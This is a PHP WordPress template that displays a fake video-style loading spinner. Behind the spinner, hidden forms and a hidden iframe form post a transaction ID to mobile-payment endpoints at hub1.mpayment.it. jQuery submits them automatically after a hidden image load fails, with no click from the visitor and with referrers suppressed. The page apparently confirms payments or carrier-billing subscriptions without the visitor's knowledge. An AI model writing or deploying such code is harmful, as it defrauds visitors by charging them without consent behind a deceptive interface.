<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;

$completeUrl = PrepareResponse::getIframeUrl();

parse_str(parse_url($completeUrl, PHP_URL_QUERY), $output);

$transactionId = $output['TransactionID'];

# get background image
$backgroundImage = Flow::instance()->getPostCustomImage(654, 368, Flow::instance()->getPostImage(654, 368));
?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="ISO-8859-1">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, minimal-ui, user-scalable=no" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<meta name="referrer" content="no-referrer">
		<style>
			#modal-handy, #header, .textwidget {
			    display: none !important;
			}
			#container {
			    position: absolute;
			    right:0;
			    left: 0;
			    margin: auto;
			}
			.loadingSpin{
			    margin:20% auto;
			    width:90%;
			}
			.loadingSpin img {
			    width:50px;
			}
			#loading {
			    font-size: 14px;
			    padding:10px;
			    color:#e3e3e3;
			    text-shadow:0 0 2px #000;
			}
			#postImg img{
			    width:100%;
			}
			#iframe0 {
				display: none;
			}
			.ytp-spinner{position:relative;width:64px;z-index:18;pointer-events:none;margin:0 auto;}.ytp-spinner-container{pointer-events:none;position:absolute;width:100%;padding-bottom:100%;top:50%;left:50%;margin-top:-50%;margin-left:-50%;animation:ytp-spinner-linspin 1.568s linear infinite;-webkit-animation:ytp-spinner-linspin 1.568s linear infinite}.ytp-spinner-rotator{position:absolute;width:100%;height:100%;-webkit-animation:ytp-spinner-easespin 5332ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-spinner-easespin 5332ms cubic-bezier(.4,0,.2,1) infinite both}.ytp-spinner-left{position:absolute;top:0;left:0;bottom:0;overflow:hidden}.ytp-spinner-right{position:absolute;top:0;right:0;bottom:0;overflow:hidden}.ytp-spinner-left{right:49%}.ytp-spinner-right{left:49%}.ytp-spinner-circle{box-sizing:border-box;position:absolute;width:200%;height:100%;border-style:solid;border-color:#ddd #ddd transparent;border-radius:50%;border-width:6px}.ytp-spinner-left .ytp-spinner-circle{left:0;right:-100%;border-right-color:transparent;-webkit-animation:ytp-spinner-left-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-spinner-left-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both}.ytp-spinner-right .ytp-spinner-circle{left:-100%;right:0;border-left-color:transparent;-webkit-animation:ytp-right-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both;animation:ytp-right-spin 1333ms cubic-bezier(.4,0,.2,1) infinite both}@-webkit-keyframes ytp-spinner-linspin{to{-webkit-transform:rotate(360deg)}}@keyframes ytp-spinner-linspin{to{transform:rotate(360deg)}}@-webkit-keyframes ytp-spinner-easespin{12.5%{-webkit-transform:rotate(135deg)}25%{-webkit-transform:rotate(270deg)}37.5%{-webkit-transform:rotate(405deg)}50%{-webkit-transform:rotate(540deg)}62.5%{-webkit-transform:rotate(675deg)}75%{-webkit-transform:rotate(810deg)}87.5%{-webkit-transform:rotate(945deg)}to{-webkit-transform:rotate(1080deg)}}@keyframes ytp-spinner-easespin{12.5%{transform:rotate(135deg)}25%{transform:rotate(270deg)}37.5%{transform:rotate(405deg)}50%{transform:rotate(540deg)}62.5%{transform:rotate(675deg)}75%{transform:rotate(810deg)}87.5%{transform:rotate(945deg)}to{transform:rotate(1080deg)}}@-webkit-keyframes ytp-spinner-left-spin{0%{-webkit-transform:rotate(130deg)}50%{-webkit-transform:rotate(-5deg)}to{-webkit-transform:rotate(130deg)}}@keyframes ytp-spinner-left-spin{0%{transform:rotate(130deg)}50%{transform:rotate(-5deg)}to{transform:rotate(130deg)}}@-webkit-keyframes ytp-right-spin{0%{-webkit-transform:rotate(-130deg)}50%{-webkit-transform:rotate(5deg)}to{-webkit-transform:rotate(-130deg)}}@keyframes ytp-right-spin{0%{transform:rotate(-130deg)}50%{transform:rotate(5deg)}to{transform:rotate(-130deg)}}
		</style>
		<?php wp_head(); ?>
	</head>
	<body>
		<img src="<?php echo $completeUrl; ?>" id="img" style="display: none;"/>
		<div id="container">
		    <div class="loadingSpin">
		    	<div class="ytp-spinner" data-layer="4">
					<div>
						<div class="ytp-spinner-container">
							<div class="ytp-spinner-rotator">
								<div class="ytp-spinner-left">
									<div class="ytp-spinner-circle"></div>
								</div>
								<div class="ytp-spinner-right">
									<div class="ytp-spinner-circle"></div>
								</div>
							</div>
						</div>
					</div>
				</div>
		    </div>
		</div>
		<div id="postImg">
		    <img src="<?php echo $backgroundImage; ?>" />
		</div>

		<iframe srcdoc="<form action='http://hub1.mpayment.it/fir' method='post'><input type='image' src='https://hub1.mpayment.it/static/src/bot_continua.png' name='picture'><input type='hidden' name='txId' value='<?php echo $transactionId; ?>'/></form>" id="iframe0" style="display:none;"></iframe>

		<form action='http://hub1.mpayment.it/gold-end.htm' method='post' id='form1' style="display: none;">
			<input type='image' src='https://hub1.mpayment.it/static/src/bot_continua.png' name='picture'>
			<input type='hidden' name='TransactionID' value='<?php echo $transactionId; ?>'/>
			<input type='hidden' name='fgds' value='true'/>
		</form>
		
		<script type="text/javascript">
			$('#img').on(
					'error', 
					function(){
						setTimeout(
							function(){
								sendRequestIframe('#iframe0');
								setTimeout(
									function(){
										sendRequest('#form1');
									}, 1000
								);
							}, 1000
						);
					}
			);
			
			function sendRequest(formID){
				$(formID).submit(); 
			}

			function sendRequestIframe(iframeId){
				$(iframeId).contents().find('form').submit();
			}
		</script>
	</body>
	</html>